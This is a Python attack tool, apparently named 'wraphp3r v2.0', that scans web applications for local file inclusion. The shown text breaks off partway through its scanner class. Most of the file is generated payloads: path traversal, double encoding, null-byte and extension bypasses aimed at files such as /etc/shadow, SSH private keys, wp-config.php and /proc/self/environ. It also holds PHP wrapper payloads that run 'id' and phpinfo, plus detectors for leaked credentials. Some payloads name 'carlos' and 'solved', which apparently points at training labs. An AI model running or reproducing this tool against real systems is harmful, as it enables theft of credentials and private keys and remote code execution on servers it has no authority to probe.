#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
import itertools
import time
import signal
import threading
import itertools as it
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Generator, Optional, Dict, Tuple
from dataclasses import dataclass
import warnings
from urllib.parse import urlparse, parse_qs, urljoin
import re
import os
import json

class Banner:
    @staticmethod
    def show():
        print(
        """
\033[96m
     __                               _         ____    
 .--()°'.'      __ __ ___ _ __ _ _ __| |_  _ __|__ /_ _ 
'|, . ,'        \\ V  V / '_/ _` | '_ \\ ' \\| '_ \\|_ \\ '_|
 !_-(_\\          \\_/\\_/|_| \\__,_| .__/_||_| .__/___/_|  
                                |_|       |_|
\033[0m
        \033[93mwraphp3r v2.0\033[0m
        \033[94mPHP Wrapper-based LFI Detection Tool\033[0m
        \033[95mAuthor: csshark\033[0m
        """
        )


class HTTPClient:
    def __init__(
        self,
        proxy: Optional[str] = None,
        follow_redirects: bool = False,
        verify_ssl: bool = True,
        cookies: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        timeout: int = 10,
        user_agent: str = "wraphper/1.0"
    ):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.follow_redirects = follow_redirects
        self.timeout = timeout
        
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
        
        default_headers = {
            "User-Agent": user_agent
        }
        
        if headers:
            default_headers.update(headers)
            
        self.session.headers.update(default_headers)
        
        if cookies:
            self.session.cookies.update(cookies)
    
    def get(self, url: str, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url,
                timeout=timeout or self.timeout,
                allow_redirects=self.follow_redirects
            )
        except requests.RequestException:
            return None
    
    def post(self, url: str, data: Optional[Dict] = None, body: Optional[str] = None,
             headers: Optional[Dict] = None, timeout: Optional[int] = None) -> Optional[requests.Response]:
        try:
            kwargs = {
                'timeout': timeout or self.timeout,
                'allow_redirects': self.follow_redirects
            }
            if body is not None:
                kwargs['data'] = body
                if headers:
                    kwargs['headers'] = headers
            else:
                kwargs['data'] = data
            return self.session.post(url, **kwargs)
        except requests.RequestException:
            return None


class PayloadGenerator:
    TRAVERSALS = [
        "../",
        "..\\",
        "..//",
        "....//",
        "....///",
        "..;/",
        "..%2f",
        "..%5c",
        "%2e%2e/",
        "%2e%2e%2f",
        "..%252f",
        "..%c0%af",
        "..%c1%9c",
        "%252e%252e%252f",
        "..%00/",
        "..\x00/",
        "....\\/",
        "..%5c..%5c",
        "..%255c",
        "%252e%252e%255c",
        "..%c0%ae%c0%ae/",
        "..%c0%ae%c0%ae%c0%af",
        "..%ef%bc%8f",
        "%ef%bc%8f%ef%bc%8f",
        "..%252f%252e%252e%252f",
        "....//....//....//....//",
        "....\\/....\\/....\\/....\\/",
        "..%252f..%252f..%252f..%252f",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
        "..././",
        "..%2f..%2f..%2f",
        "..%c0%2f",
        "..%c0%5c",
        "%c0%ae%c0%ae%c0%af",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f",
        "/%252e%252e%252f%252e%252e%252f",
        "....//....//....//....//....//....//",
        "..%252f..%252f..%252f..%252f..%252f..%252f",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f",
    ]
    
    FILE_TARGETS = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/shadow",
        "/etc/group",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/version",
        "/proc/cpuinfo",
        "/proc/meminfo",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/auth.log",
        "/home/carlos/secret",
        "/home/carlos/.bash_history",
        "/home/carlos/.ssh/id_rsa",
        "/root/.ssh/id_rsa",
        "/var/www/html/index.php",
        "/var/www/index.php",
        "/var/www/html/wp-config.php",
        "C:/Windows/win.ini",
        "C:/Windows/system.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/xampp/apache/logs/access.log",
        "C:/xampp/apache/logs/error.log",
        "C:/wamp/logs/access.log",
        "C:/wamp/logs/error.log",
        "C:/Program Files/Apache Group/Apache2/logs/access.log",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/httpd/conf/httpd.conf",
        "/etc/mysql/my.cnf",
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php/8.1/cli/php.ini",
        "/etc/php/8.2/fpm/php.ini",
        "/var/www/html/.htaccess",
        "/var/www/.htaccess",
        "/etc/apache2/sites-available/000-default.conf",
        "/etc/apache2/sites-enabled/000-default.conf",
        "/home/carlos/.bashrc",
        "/home/carlos/.profile",
        "/root/.bash_history",
        "/root/.bashrc",
    ]
    
    FILTER_CHAINS = [
        "convert.base64-encode",
        "convert.base64-decode",
        "string.rot13",
        "string.toupper",
        "string.tolower",
        "string.strip_tags",
        "convert.iconv.utf-8.utf-16",
        "convert.iconv.utf-16.utf-8",
        "convert.iconv.UTF8.CSISO2022KR",
        "convert.iconv.CSISO2022KR.UTF8",
        "convert.quoted-printable-encode",
        "convert.quoted-printable-decode",
        "zlib.deflate",
        "zlib.inflate",
        "bzip2.compress",
        "bzip2.decompress",
        "convert.iconv.ISO-8859-1.UTF-8",
        "convert.iconv.UTF-8.ISO-8859-1",
        "string.rot13|convert.base64-encode",
        "convert.base64-encode|convert.base64-decode",
        "convert.iconv.utf-8.utf-16|convert.base64-encode",
        "convert.iconv.utf-16.utf-8|convert.base64-decode",
        "zlib.deflate|convert.base64-encode",
        "convert.iconv.utf-8.utf-16|convert.iconv.utf-16.utf-8",
        "string.rot13|convert.iconv.utf-8.utf-16",
    ]
    
    WRAPPER_PAYLOADS = [
        "php://filter/{FILTER}/resource={PATH}",
        "php://filter/{FILTER}/resource=php://temp",
        "file://{PATH}",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "data://text/plain,<?php phpinfo();?>",
        "expect://id",
        "phar://{PATH}",
        "zip://{PATH}%23test",
        "compress.zlib://{PATH}",
        "compress.bzip2://{PATH}",
        "php://input",
        "php://filter/convert.base64-encode/resource={PATH}",
        "php://filter/string.rot13/resource={PATH}",
        "php://filter/convert.iconv.utf-8.utf-16/resource={PATH}",
        "php://filter/zlib.deflate/convert.base64-encode/resource={PATH}",
    ]
    
    NULL_BYTE_VARIANTS = [
        "%00", "\x00", ";", "?", "&", "#",
        "%00.jpg", "%00.php", "%00.html", "%2500",
        " %00", ";%00", "?%00", "&%00",
    ]
    
    EXTENSION_BYPASS_METHODS = [
        "%00",
        "\x00",
        "%2500",
        ";",
        "?",
        "&",
        "#",
        " %00",
        ";%00",
        "?%00",
        "/." * 100,
        "/././././././././././././././././././././././././././././././.",
        "%00.png",
        "%00.html",
        "%00.php",
        "%00.jpg",
        "%00.txt",
        "%00%00",
        "%2500.png",
        "%2500.html",
        "%252e%252e%252f",
        "....//....//....//....//",
        "..//..//..//..//",
        "..././..././..././",
    ]
    
    COMMON_EXTENSIONS = [
        ".php", ".html", ".inc", ".jpg", ".jpeg", ".png", ".gif", 
        ".txt", ".xml", ".json", ".pdf", ".doc", ".tmp", ".bak",
        ".php5", ".phtml", ".phar", ".shtml", ".asp", ".aspx"
    ]
    
    def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
                 intensity: str = "normal", smart_mode: bool = False, doc_root: Optional[str] = None):
        self.custom_files = custom_files
        self.target_dir = target_dir
        self.intensity = intensity
        self.smart_mode = smart_mode
        self.doc_root = doc_root
    
    def generate_path_variants(self, file_path: str) -> List[str]:
        variants = set()
        clean = file_path.lstrip('/')
        variants.add(file_path)
        variants.add(clean)
        
        for i in range(1, 8):
            variants.add(("../" * i) + file_path)
            variants.add(("../" * i) + clean)
        for i in [10, 15, 20]:
            if self.intensity == "aggressive":
                variants.add(("../" * i) + file_path)
        
        web_roots = [
            "/var/www/html/",
            "/var/www/",
            "/var/www/images/",
            "/var/www/upload/",
            "/usr/local/apache2/htdocs/",
            "/home/*/public_html/",
            "/opt/lampp/htdocs/",
            "/srv/http/",
            "/usr/share/nginx/html/",
        ]
        for root in web_roots:
            if "*" in root:
                continue
            variants.add(root + file_path)
            variants.add(root + "../../.." + file_path)
            variants.add(root + "../../../.." + file_path)
        
        variants.add(f"....//....//....//....//{file_path}")
        variants.add(f"....\\/....\\/....\\/....\\/{file_path}")
        variants.add(f"..%2f..%2f..%2f..%2f{clean}")
        variants.add(f"..%5c..%5c..%5c..%5c{clean}")
        variants.add(f"....//....//....//....//....//....//{file_path}")
        
        if self.intensity == "aggressive":
            for overlong in ["..%c0%ae%c0%ae/", "..%c0%ae%c0%ae%c0%af", "%c0%ae%c0%ae%c0%af"]:
                variants.add(overlong + file_path)
                variants.add(overlong + clean)
            variants.add(f"..././..././..././{file_path}")
            variants.add(f"..//..//..//..//..//{file_path}")
        
        return list(variants)
    
    def generate_double_encoding_variants(self, file_path: str) -> List[str]:
        variants = set()
        clean = file_path.lstrip('/')
        
        variants.add(f"..%252f..%252f..%252f..%252f{clean}")
        variants.add(f"..%252f..%252f..%252f..%252f..%252f{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        variants.add(f"..%255c..%255c..%255c..%255c{clean}")
        variants.add(f"%252e%252e%255c%252e%252e%255c{clean}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
        
        if self.intensity == "aggressive":
            for i in range(1, 6):
                pre = "..%252f" * i
                variants.add(pre + clean)
            variants.add("%25%32%65%25%32%65%25%32%66" + clean)
            variants.add("%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66" + clean)
        
        encoded_path = urllib.parse.quote(file_path)
        variants.add(f"..%252f..%252f..%252f..%252f{encoded_path}")
        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{encoded_path}")
        
        return list(variants)
    
    def generate_filter_chains(self) -> List[str]:
        chains = []
        for r in range(1, 3):
            for combo in itertools.permutations(self.FILTER_CHAINS[:15], r):
                chains.append("|".join(combo))
        return chains
    
    def generate_null_byte_bypasses(self, file_path: str) -> List[str]:
        """Generate null byte injection payloads that bypass extension appending"""
        variants = set()
        clean_path = file_path.lstrip('/')
        
        for null in ["%00", "\x00", "%2500"]:
            variants.add(f"{clean_path}{null}")
            variants.add(f"....//....//....//....//{clean_path}{null}")
            variants.add(f"..%2f..%2f..%2f..%2f{clean_path}{null}")
            variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}")
            variants.add(f"..%c0%af..%c0%af..%c0%af{clean_path}{null}")
        
        for null in ["%00", "\x00"]:
            for ext in self.COMMON_EXTENSIONS[:10]:
                variants.add(f"{clean_path}{null}{ext}")
                variants.add(f"....//....//....//....//{clean_path}{null}{ext}")
                variants.add(f"..%2f..%2f..%2f..%2f{clean_path}{null}{ext}")
                variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}{ext}")
                variants.add(f"../../../{clean_path}{null}{ext}")
                variants.add(f"..%2f..%2f..%2f{clean_path}{null}{ext}")
                variants.add(f"..%252f..%252f..%252f{clean_path}{null}{ext}")
                variants.add(f"....//....//....//....//{clean_path}{null}{ext}")
        
        for sep in ["?", "&", "#"]:
            variants.add(f"{clean_path}{sep}")
            for ext in self.COMMON_EXTENSIONS[:5]:
                variants.add(f"{clean_path}{sep}{ext}")
                variants.add(f"../../../{clean_path}{sep}{ext}")
                variants.add(f"..%252f..%252f..%252f{clean_path}{sep}{ext}")
        
        for sep in [";", ";/"]:
            variants.add(f"{clean_path}{sep}")
            variants.add(f"../../../{clean_path}{sep}")
            variants.add(f"....//....//....//....//{clean_path}{sep}")
        
        if self.intensity == "aggressive":
            long_path = "/." * 100
            variants.add(f"{clean_path}{long_path}")
            variants.add(f"../../../{clean_path}{long_path}")
            variants.add(f"{clean_path}...........................................................................")
            variants.add(f"../../../{clean_path}...........................................................................")
            
            for null in ["%00", "%2500"]:
                for ext in [".php", ".html", ".jpg", ".png", ".gif", ".txt", ".inc"]:
                    variants.add(f"..%252f..%252f..%252f..%252f{clean_path}{null}{ext}")
                    variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean_path}{null}{ext}")
        
        return list(variants)
    
    def generate_extension_stripping_bypasses(self, file_path: str) -> List[str]:
        """Bypass extension filtering/validation"""
        variants = set()
        clean_path = file_path.lstrip('/')
        path_no_ext = clean_path.rsplit('.', 1)[0] if '.' in clean_path else clean_path
        
        bypass_patterns = [
            f"{path_no_ext}%00",
            f"{path_no_ext}%00.php",
            f"{path_no_ext}%00.html",
            f"{path_no_ext}%00.jpg",
            f"{path_no_ext}%00.png",
            f"{path_no_ext}%00.txt",
            f"{path_no_ext}%00.inc",
            f"{path_no_ext}.php%00",
            f"{path_no_ext}.php%00.png",
            f"{path_no_ext}.php%00.jpg",
            f"{path_no_ext}.php%00.html",
            f"{path_no_ext}.php%00.txt",
            f"{path_no_ext}.php/.",
            f"{path_no_ext}.php%00.",
            f"{path_no_ext}.php/.",
            f"{path_no_ext}.php%00.pdf",
            f"{path_no_ext}%2ephp",
            f"{path_no_ext}.pHp",
            f"{path_no_ext}.PHP",
            f"{path_no_ext}.PhP",
            f"{path_no_ext}.phtml",
            f"{path_no_ext}.pHP",
            f"{path_no_ext}.Php",
            f"{path_no_ext}.phP",
            f"php://filter/convert.base64-encode/resource={clean_path}",
            f"php://filter/string.rot13/resource={clean_path}",
            f"php://filter/convert.iconv.utf-8.utf-16/resource={clean_path}",
            f"{clean_path}/.",
            f"{clean_path}/./.",
            f"{clean_path}/././.",
            f"{path_no_ext}%00.jpg%00",
            f"{path_no_ext}%00.png%00",
            f"{path_no_ext}%00.php%00",
        ]
        
        variants.update(bypass_patterns)
        
        for pattern in bypass_patterns[:20]:
            variants.add(f"../../../{pattern}")
            variants.add(f"....//....//....//....//{pattern}")
            variants.add(f"..%252f..%252f..%252f..%252f{pattern}")
            variants.add(f"..%2f..%2f..%2f..%2f{pattern}")
            
            if self.intensity == "aggressive":
                variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{pattern}")
                variants.add(f"..%c0%af..%c0%af..%c0%af{pattern}")
        
        return list(variants)
    
    def generate_specific_lab_bypasses(self) -> List[str]:
        payloads = set()
        
        for target in ["/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/issue"]:
            clean = target.lstrip('/')
            
            # Extension validation bypass with null byte
            payloads.add(f"../../../{clean}%00.png")
            payloads.add(f"../../../{clean}%00.jpg")
            payloads.add(f"../../../{clean}%00.php")
            payloads.add(f"../../../{clean}%00.html")
            payloads.add(f"../../../{clean}%00.txt")
            payloads.add(f"....//....//....//....//{clean}%00.png")
            payloads.add(f"....//....//....//....//{clean}%00.jpg")
            payloads.add(f"..%2f..%2f..%2f{clean}%00.png")
            payloads.add(f"..%2f..%2f..%2f{clean}%00.jpg")
            payloads.add(f"..%252f..%252f..%252f{clean}%2500.png")
            payloads.add(f"..%252f..%252f..%252f{clean}%2500.jpg")
            payloads.add(f"{clean}%00.html")
            payloads.add(f"{clean}%00.png")
            payloads.add(f"{clean}.php%00.png")
            payloads.add(f"{clean}.php%00.jpg")
            payloads.add(f"{clean}%00.jpg")
            payloads.add(f"{clean}%00.txt")
            payloads.add(f"..%252f..%252f..%252f..%252f{clean}%00.png")
            payloads.add(f"..%252f..%252f..%252f..%252f{clean}%00.jpg")
            payloads.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}%00.png")
            payloads.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}%00.jpg")
            
            # Path truncation bypass
            payloads.add(f"../../../{clean}%00")
            payloads.add(f"../../../{clean}%2500")
            payloads.add(f"../../../{clean}%00.")
            payloads.add(f"../../../{clean}%00..")
            payloads.add(f"../../../{clean}%00%00")
            
            # Double extension bypass
            payloads.add(f"../../../{clean}.php%00.png")
            payloads.add(f"../../../{clean}.php%00.jpg")
            payloads.add(f"..%252f..%252f..%252f{clean}.php%00.png")
            
            # Question mark and hash bypass
            payloads.add(f"../../../{clean}?.png")
            payloads.add(f"../../../{clean}?.jpg")
            payloads.add(f"../../../{clean}?.html")
            payloads.add(f"../../../{clean}#.png")
            payloads.add(f"../../../{clean}#.jpg")
            
            # Semi-colon bypass
            payloads.add(f"../../../{clean};.png")
            payloads.add(f"../../../{clean};.jpg")
            payloads.add(f"../../../{clean};")
        
        # Path validation bypass - start of path
        for target in self.FILE_TARGETS[:5]:
            clean = target.lstrip('/')
            payloads.add(f"/var/www/images/../../../..{target}")
            payloads.add(f"/var/www/images/../../../../../..{target}")
            payloads.add(f"/var/www/html/../../../..{target}")
            payloads.add(f"/var/www/html/../../../../../..{target}")
            payloads.add(f"/images/../../../..{target}")
            payloads.add(f"/static/../../../..{target}")
            payloads.add(f"/uploads/../../../..{target}")
            payloads.add(f"/assets/../../../..{target}")
            payloads.add(f"/css/../../../..{target}")
            payloads.add(f"/js/../../../..{target}")
            payloads.add(f"/img/../../../..{target}")
        
        # Absolute path bypass
        for target in self.FILE_TARGETS[:8]:
            payloads.add(target)
            payloads.add(f"file://{target}")
        
        # PHP wrapper bypasses for restricted file access
        payloads.add("php://filter/convert.base64-encode/resource=/etc/passwd")
        payloads.add("php://filter/string.rot13/resource=/etc/passwd")
        payloads.add("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
        payloads.add("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd")
        payloads.add("php://filter/convert.base64-encode/resource=../../../etc/passwd")
        payloads.add("php://filter/string.rot13/resource=../../../etc/passwd")
        
        # RFI-style data wrapper
        payloads.add("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==")
        payloads.add("data://text/plain,<?php phpinfo();?>")
        payloads.add("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==")
        
        # Additional aggressive bypasses
        if self.intensity == "aggressive":
            for target in self.FILE_TARGETS[:5]:
                clean = target.lstrip('/')
                payloads.add(f"....//....//....//....//....//....//{clean}%00.png")
                payloads.add(f"..%252f..%252f..%252f..%252f..%252f{clean}%00.png")
                payloads.add(f"..%c0%af..%c0%af..%c0%af..%c0%af{clean}%00.png")
                payloads.add(f"..%c0%ae%c0%ae%c0%af{clean}%00.png")
                payloads.add(f"%c0%ae%c0%ae%c0%af{clean}%00.png")
                payloads.add(f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{clean}%00.png")
        
        return list(payloads)
    
    def generate(self) -> Generator[str, None, None]:
        file_targets = self.custom_files if self.custom_files else self.FILE_TARGETS
        
        if self.target_dir:
            file_targets = [self.target_dir] + list(file_targets)
        
        filter_chains = self.generate_filter_chains()
        if self.intensity == "light":
            filter_chains = filter_chains[:5]
        elif self.intensity == "normal":
            filter_chains = filter_chains[:15]
        
        yield from self.generate_specific_lab_bypasses()
        
        for target in file_targets:
            yield from self.generate_null_byte_bypasses(target)
        
        if self.intensity in ["aggressive", "normal"]:
            for target in file_targets:
                yield from self.generate_extension_stripping_bypasses(target)
        
        for target in file_targets:
            yield target
            yield f"....//....//....//....//{target}"
            yield f"..%252f..%252f..%252f..%252f{target}"
            yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{target}"
            yield f"..%2f..%2f..%2f..%2f{target}"
        
        for target in file_targets:
            path_variants = self.generate_path_variants(target)
            double_encoded = self.generate_double_encoding_variants(target)
            all_paths = set(path_variants + double_encoded)
            
            for path in all_paths:
                yield path
                yield urllib.parse.quote(path, safe='%')
                
                if self.intensity in ["aggressive", "normal"]:
                    yield urllib.parse.quote(urllib.parse.quote(path, safe='%'), safe='%')
                
                for null in self.NULL_BYTE_VARIANTS:
                    if self.intensity == "aggressive" or null in ["%00", "\x00", "%2500"]:
                        yield f"{path}{null}"
                        yield f"{urllib.parse.quote(path, safe='%')}{null}"
                
                if self.intensity == "aggressive":
                    for ext in [".", "./", ".php", ".html", ".jpg", ".txt", ".png", ".gif"]:
                        yield f"{path}{ext}"
                        yield f"{urllib.parse.quote(path, safe='%')}{ext}"
                
                for wrapper in self.WRAPPER_PAYLOADS:
                    if "{PATH}" in wrapper and "{FILTER}" in wrapper:
                        for chain in filter_chains[:5]:
                            yield wrapper.replace("{FILTER}", chain).replace("{PATH}", path)
                    elif "{PATH}" in wrapper:
                        yield wrapper.replace("{PATH}", path)
                    else:
                        yield wrapper
        
        if self.intensity == "aggressive":
            for target in file_targets:
                yield f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{target}"
                yield f"%ef%bc%8f%ef%bc%8f%ef%bc%8f{target}"
                yield f"..%c0%ae%c0%ae%c0%af{target}"
                yield f"%c0%ae%c0%ae%c0%af{target}"
                yield f"..%c0%af..%c0%af..%c0%af{target}"
                yield f"..%c0%2f..%c0%2f..%c0%2f{target}"
                
                clean = target.lstrip('/')
                yield f"..././..././..././{clean}"
                yield f"..//..//..//..//..//{clean}"
                yield f"....//....//....//....//....//....//{clean}"
                yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}"


class ResponseAnalyzer:
    INDICATORS = {
        "root:x:0:0": {"type": "LFI", "confidence": 0.95},
        "root:*:0:0": {"type": "LFI", "confidence": 0.95},
        "daemon:x:1:1": {"type": "LFI", "confidence": 0.9},
        "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
        "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
        "carlos:x:": {"type": "LFI", "confidence": 0.95},
        "carlos:$": {"type": "LFI", "confidence": 0.9},
        "carlos:!": {"type": "LFI", "confidence": 0.9},
        "[fonts]": {"type": "LFI", "confidence": 0.9},
        "[extensions]": {"type": "LFI", "confidence": 0.9},
        "[mci extensions]": {"type": "LFI", "confidence": 0.9},
        "[files]": {"type": "LFI", "confidence": 0.85},
        "127.0.0.1": {"type": "LFI", "confidence": 0.7},
        "localhost": {"type": "LFI", "confidence": 0.7},
        "uid=": {"type": "RCE", "confidence": 0.95},
        "gid=": {"type": "RCE", "confidence": 0.95},
        "VULN": {"type": "RCE", "confidence": 0.8},
        "phpinfo()": {"type": "RCE", "confidence": 0.9},
        "PHP Version": {"type": "RCE", "confidence": 0.9},
        "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
        "solved": {"type": "SUCCESS", "confidence": 1.0},
        "Volume Serial Number": {"type": "LFI", "confidence": 0.85},
        "[boot loader]": {"type": "LFI", "confidence": 0.85},
        "root::0:0": {"type": "LFI", "confidence": 0.8},
        "mysql:x:": {"type": "LFI", "confidence": 0.8},
        "www-data:x:": {"type": "LFI", "confidence": 0.8},
        "DOCUMENT_ROOT=": {"type": "ENV", "confidence": 0.7},
        "SERVER_ADMIN": {"type": "ENV", "confidence": 0.7},
        "ServerRoot": {"type": "LFI", "confidence": 0.75},
        "DocumentRoot": {"type": "LFI", "confidence": 0.75},
        "DB_PASSWORD": {"type": "LFI", "confidence": 0.9},
        "DB_USER": {"type": "LFI", "confidence": 0.9},
        "WP_DEBUG": {"type": "LFI", "confidence": 0.8},
        "AUTH_KEY": {"type": "LFI", "confidence": 0.85},
        "SECURE_AUTH_KEY": {"type": "LFI", "confidence": 0.85},
        "listen": {"type": "LFI", "confidence": 0.6},
        "ServerName": {"type": "LFI", "confidence": 0.6},
        "ServerAdmin": {"type": "LFI", "confidence": 0.6},
    }
    
    ERROR_PATTERNS = [
        r"Warning:\s+include\(([^)]+)\)",
        r"Warning:\s+require\(([^)]+)\)",
        r"Warning:\s+include_once\(([^)]+)\)",
        r"Warning:\s+require_once\(([^)]+)\)",
        r"failed to open stream:\s+(.+?)\s+in",
        r"No such file or directory in (.+?) on line",
        r"open_basedir restriction in effect",
        r"Call to undefined function",
        r"Undefined variable",
        r"Cannot modify header information",
        r"PHP Warning:",
        r"PHP Notice:",
        r"PHP Fatal error:",
        r"Warning: file_get_contents",
        r"failed to open stream: No such file or directory",
    ]
    
    @staticmethod
    def extract_path_from_error(content: str) -> Optional[str]:
        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                path = match.group(1) if match.lastindex else match.group(0)
                return path.strip()
        return None
    
    @staticmethod
    def extract_content_snippet(content: str, max_lines: int = 3, max_chars: int = 150) -> Optional[str]:
        """Extract a relevant snippet from the response content for quick identification"""
        if not content:
            return None
        
        lines = content.split('\n')
        relevant_lines = []
        
        for line in lines:
            # Skip empty lines and HTML tags
            line = line.strip()
            if not line:
                continue
            
            # Clean HTML tags for display
            clean_line = re.sub(r'<[^>]+>', '', line).strip()
            if not clean_line:
                continue
            
            # Look for lines containing common file content patterns
            if any(pattern in clean_line for pattern in [
                'root:', 'daemon:', 'bin:', 'nobody:', 'www-data:',
                'x:0:0', 'x:1:1', 'x:2:2',
                '127.0.0.1', 'localhost', 'Volume Serial',
                'DB_PASSWORD', 'DB_USER', 'DB_NAME', 'DB_HOST',
                'AUTH_KEY', 'SECURE_AUTH', 'WP_HOME',
                'uid=', 'gid=', 'PHP Version',
                '[', 'ServerRoot', 'DocumentRoot',
                'DOCUMENT_ROOT', 'SERVER_ADMIN',
                'carlos:', '/bin/bash', '/bin/sh',
                'listen', 'ServerName'
            ]):
                relevant_lines.append(clean_line)
            
            if len(relevant_lines) >= max_lines:
                break
        
        if relevant_lines:
            snippet = ' | '.join(relevant_lines)
            if len(snippet) > max_chars:
                snippet = snippet[:max_chars-3] + '...'
            return snippet
        
        # If no specific patterns found, return first non-empty line
        for line in lines:
            clean_line = re.sub(r'<[^>]+>', '', line).strip()
            if clean_line and len(clean_line) > 10:
                return clean_line[:max_chars]
        
        return None
    
    @staticmethod
    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            cleaned = ''.join(content.split())
            if len(cleaned) % 4 == 0 and len(cleaned) > 20:
                try:
                    decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except:
                    pass
            
            b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
            for match in b64_pattern:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except:
                    continue
        except:
            pass
        return None, None
    
    @staticmethod
    def analyze_php_errors(content: str) -> Dict:
        errors = {}
        
        path = ResponseAnalyzer.extract_path_from_error(content)
        if path:
            errors['exposed_path'] = path
            errors['error_type'] = 'path_disclosure'
        
        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
        if abs_paths:
            errors['absolute_paths'] = abs_paths
        
        doc_match = re.search(r'in\s+(/[\w/.-]+)', content)
        if doc_match:
            errors['possible_doc_root'] = doc_match.group(1)
        
        return errors
    
    @staticmethod
    def analyze(content: str, response_headers: Dict = None) -> Dict:
        result = {
            'vulnerability_type': None,
            'confidence': 0.0,
            'details': {},
            'indicators_found': [],
            'content_snippet': None
        }
        
        if not content:
            return result
        
        for pattern, info in ResponseAnalyzer.INDICATORS.items():
            if pattern in content:
                result['indicators_found'].append({
                    'pattern': pattern,
                    'type': info['type'],
                    'confidence': info['confidence']
                })
                
                if info['confidence'] > result['confidence']:
                    result['vulnerability_type'] = info['type']
                    result['confidence'] = info['confidence']
        
        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(content)
        if vuln_type:
            result['vulnerability_type'] = vuln_type
            result['confidence'] = max(result['confidence'], 0.8)
            result['details']['base64_decoded'] = decoded[:500]
            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)
        
        if not result['content_snippet']:
            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(content)
        
        php_errors = ResponseAnalyzer.analyze_php_errors(content)
        if php_errors:
            result['details']['php_errors'] = php_errors
            
            if 'exposed_path' in php_errors:
                result['confidence'] = max(result['confidence'], 0.85)
                if not result['vulnerability_type']:
                    result['vulnerability_type'] = 'PATH_DISCLOSURE'
        
        if response_headers:
            result['details']['interesting_headers'] = {}
            for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
                if header in response_headers:
                    result['details']['interesting_headers'][header] = response_headers[header]
        
        return result


@dataclass
class Finding:
    payload: str
    vuln_type: str
    confidence: float
    details: Dict = None
    url: str = ""
    content_snippet: str = ""
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}


class ProgressAnimator(threading.Thread):
    def __init__(self, scanner):
        super().__init__(daemon=True)
        self.scanner = scanner
        self.running = True
    
    def run(self):
        spinner = it.cycle(["|", "/", "-", "\\"])
        
        while self.running:
            with self.scanner.lock:
                print(
                    f"\r[{next(spinner)}] "
                    f"Tested: {self.scanner.tested} | "
                    f"Findings: {len(self.scanner.findings)} | "
                    f"Active Threads: {threading.active_count()-2}",
                    end="",
                    flush=True
                )
            time.sleep(0.1)


class LFIScanner:
    def __init__(
        self,
        client: HTTPClient,
        delay: float = 0.1,
        threads: int = 10,
        method: str = "GET",
        post_data: Dict = None,
        target_files: Optional[List[str]] = None,
        target_dir: Optional[str] = None,
        intensity: str = "normal",
        output_file: Optional[str] = None,
        verbose: bool = False,
        smart_mode: bool = False
    ):
        self.client = client
        self.delay = delay
